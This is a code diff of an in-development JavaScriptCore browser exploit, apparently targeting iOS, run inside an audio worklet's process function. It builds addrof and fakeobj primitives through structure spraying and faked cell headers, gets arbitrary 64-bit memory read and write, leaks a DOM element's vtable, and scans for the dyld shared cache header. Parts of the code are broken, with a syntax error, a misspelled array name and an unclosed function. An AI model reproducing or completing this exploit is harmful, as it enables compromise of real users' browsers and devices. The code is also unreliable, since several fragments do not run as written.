@@ -616,16 +616,19 @@ b.process = (inputs, outputs, parameters)=>{
     }
     else if(stage == "bypass_etc"){
         //fuck.port.postMessage(typeof parameters);
-        var structs = []
-     var i = 0;
-     var abc = [13.37];
-     abc.pointer = 1234;
-     abc['prop' + i] = 13.37;
-     structs.push(abc);
-     var victim = structs[0];
-        jscell_header = structs[0];
-
-        evil_arr_butterfly = floatAsQword(structs[0]);
+         var gcPreventer = [];
+        for (let i = 0; i < 2; i++) {
+            let a = i == 0 ? parameters : victim;
+            gcPreventer.push(a[0]);
+        }
+        jscell_header = gcPreventer[0];
+        
+        var gcPreventer = [];
+        for (let i = 0; i < 2; i++) {
+            let a = i == 0 ? parameters : victim;
+            gcPreventer.push(a[1]);
+        }
+        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
         
         structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
         if(structure_id == 0 ){
@@ -676,65 +679,84 @@ b.process = (inputs, outputs, parameters)=>{
             return boxed[0];
         }
         
-        var memory = {
-        addrof: addrof(),
-        fakeobj: fakeObj(),
+        // Fill an array we are going to spray with arrays with an element & property,
+    // specifically doubles (important! because we can use raw doubles to represent
+    // pointers)
+    var structure_spray[];
+    for(var i = 0; i < 1000; i++) {
+        var arr = [13.37];
+        arr.a = 1337;
+        arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
+        structure_spray_spray.push(arr)
+    }
 
-        // Write an int64 to the given address.
-        writeInt64(addr, int64) {
-            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
-            victim.prop = int64.asJSValue();
-        },
+    // Pick a victim, any victim (seriously, any in the middle-ish)
+    var victim = structure_spray[444];
 
-        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16(addr, value) {
-            // Set butterfly of victim object and dereference.
-            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
-            victim.prop = value;
-        },
+    // Create some new arrays to do memory manipulation on, one 32 bit, the other 64.
+    var convert = new ArrayBuffer(0x10);
+    var u32 = new Uint32Array(convert);
+    var f64 = new Float64Array(convert);
 
-        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write(addr, data) {
-            while (data.length % 4 != 0)
-                data.push(0);
+    // Setup flag values for ArrayWithDouble & ArrayWithContiguous
+    u32[0] = 0x200; 
+    u32[1] = 0x01082007 - 0x10000;
+    var flag_dbl = f64[0];
+    u32[1] = 0x01082009 - 0x10000;
+    var flag_cnt = u32[0];
 
-            var bytes = new Uint8Array(data);
-            var ints = new Uint16Array(bytes.buffer);
-
-            for (var i = 0; i < ints.length; i++)
-                this.write16(Add(addr, 2 * i), ints[i]);
-        },
-
-        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64(addr) {
-            // Set butterfly of victim object and dereference.
-            evil_arr[boxed_offset] = Add(addr, 0x10).asDouble();
-            return this.addrof(victim.prop);
-        },
-
-        // Verify that memory read and write primitives work.
-        test() {
-            var v = {};
-            var obj = {p: v};
-
-            var addr = this.addrof(obj);
-            assert(this.fakeobj(addr).p == v, "addrof and/or fakeobj does not work");
-
-            var propertyAddr = Add(addr, 0x10);
-
-            var value = this.read64(propertyAddr);
-            assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");
-
-            this.write16(propertyAddr, 0x1337);
-            assert(obj.p == 0x1337, "write16 does not work");
-        },
+    // Create a placeholder object. Outer because it will be the "outer" of hax
+    // Use contiguous so we can play with JSValues of objects. Changed to dbl/ptr later
+    var outer = {
+        cell_header: flag_cnt,
+        butterfly: victim,
     };
 
-    // Testing code, not related to exploit
-    var plainObj = {};
-    var header = memory.read64(addrof(plainObj));
-    memory.writeInt64(memory.addrof(container), header);
-    memory.test();
+    // Create our custom-crafted hax object
+    // hax: cellheader of ArrayWithContiguous, butterfly is victim
+    f64[0] = addrof(outer);
+    u32[0] += 0x10;
+    var hax = fakeobj(f64[0]);
+
+    // Create and point boxed and unboxed to random locations
+    // Their contents aren't important, only their types
+    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
+    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
+    var boxed = [{}];
+
+    // "Point" refers to changing the given array's butterfly
+    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
+    //
+    // First, point victim[] to unboxed[]
+    // Second, save the location of unboxed
+    // Third, point victim[] to boxed[]
+    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
+    // 
+    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
+    // and then access them as objects with boxed[]
+    hax[1] = unboxed;
+    var tmp_bfly_ptr = victim[1];
+    hax[1] = boxed;
+    victim[1] = tmp_bfly_ptr;
+
+    // Change hax[] from an ArrayWithContiguous into an ArrayWithDouble
+    // This is necessary inorder to avoid boxing our values below when using hax[]
+    outer.cell_header = flag_dbl;
+
+    // Arbitrary read
+    read64 = function(ptr) {
+        f64[0] = ptr;
+        u32[0] += 0x10; // Because accessing property does -0x10
+        hax[1] = f64[0];
+        return victim.a;
+    }
+
+    // Arbitrary write
+    write64 = function(ptr, val) {
+        f64[0] = ptr;
+        u32[0] += 0x10; // Because accessing property does -0x10
+        hax[1] = f64[0];
+        victim.a = val;
     print("[+] limited memory read/write working");
         
         
@@ -757,89 +779,7 @@ b.process = (inputs, outputs, parameters)=>{
         throw null;
     }
         var print1 = fuck.port.postMessage();
-        function foo(obj) {
-   return delete obj["x"];
- }
-// noInline(foo);
-//foo(null);
-
-  let o = {};
-
-  for (let i = 0; i < 10000; ++i) {
-   Object.defineProperty(o, "x", {});
-   foo({});
-   foo({x:0x4141414141});
-}
-        
-        
-
-    var memory = {
-        addrof: addrof,
-        fakeobj: fakeobj,
-
-        // Write an int64 to the given address.
-        writeInt64(addr, int64) {
-            hax[1] = Add(addr, 0x10).asDouble();
-            victim.pointer = int64.asJSValue();
-        },
-
-        // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
-        write16(addr, value) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
-            victim.pointer = value;
-        },
-
-        // Write a number of bytes to the given address. Corrupts 6 additional bytes after the end.
-        write(addr, data) {
-            while (data.length % 4 != 0)
-                data.push(0);
-
-            var bytes = new Uint8Array(data);
-            var ints = new Uint16Array(bytes.buffer);
-
-            for (var i = 0; i < ints.length; i++)
-                this.write16(Add(addr, 2 * i), ints[i]);
-        },
-
-        // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
-        read64(addr) {
-            // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
-            return this.addrof(victim.pointer);
-        },
-
-        // Verify that memory read and write primitives work.
-        test() {
-            var v = {};
-            var obj = {p: v};
-
-            var addr = this.addrof(obj);
-            if(this.fakeobj(addr).p == v){
-                print1(`addrof and/or fakeobj does not work`);
-            }
-
-            var propertyAddr = Add(addr, 0x10);
-
-            var value = this.read64(propertyAddr);
-            if(value.asDouble() == addrof(v).asDouble()) {
-                print1(`read64 does not work`);
-            }
-
-            this.write16(propertyAddr, 0x1337);
-            if(obj.p == 0x1337) {
-                print1(`write16 does not work`);
-            }
-        },
-    };
-
-    // Testing code, not related to exploit
-    var plainObj = {};
-    var header = memory.read64(addrof(plainObj));
-    memory.writeInt64(memory.addrof(container), header);
-    memory.test();
-    print1(`[+] semi - arbitrary memory read/write working`);
-        
+     
         stage = "parsecache";
         return true;
     }
@@ -853,11 +793,11 @@ b.process = (inputs, outputs, parameters)=>{
         let ad_div = addrof(d);
         print1("[+] Address of the div is "+ad_div.toString(16));
         //alert(FPO)
-        let exe_ptr = memory.read_i64(Add(ad_div, FPO),0);
+        let exe_ptr = memory.read64(Add(ad_div, FPO));
         print1("[+] Executable instance is at "+exe_ptr.toString(16));
-        let v_tlb = memory.read_i64(exe_ptr,0);
+        let v_tlb = memory.read64(exe_ptr);
         print1("[+] divelement vtable seems to be at "+v_tlb.toString(16));
-        var anchor = memory.read_i64(v_tlb,0);
+        var anchor = memory.read64(v_tlb);
         //function exponentiate(x, y) { return x ** y; }
         /*var l1, l2;
         l1[0] = {}
@@ -899,7 +839,7 @@ b.process = (inputs, outputs, parameters)=>{
         while(true)
         {
         /*FUCK THIS TEAM!!! Whole time header is just the Webcore header not the fucking shared cache header!!!! A whole year of struggling to get this update to work just to find out it's fucking wrong...*/
-        if(strcmp(memory.read(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
+        if(strcmp(memory.read64(hdr, 0x10), "dyld_v1   arm64")) //cache header magic
         //webcore header magic...
         {
             print1(String.fromCharCode(...memory.read(hdr, 0x10)))
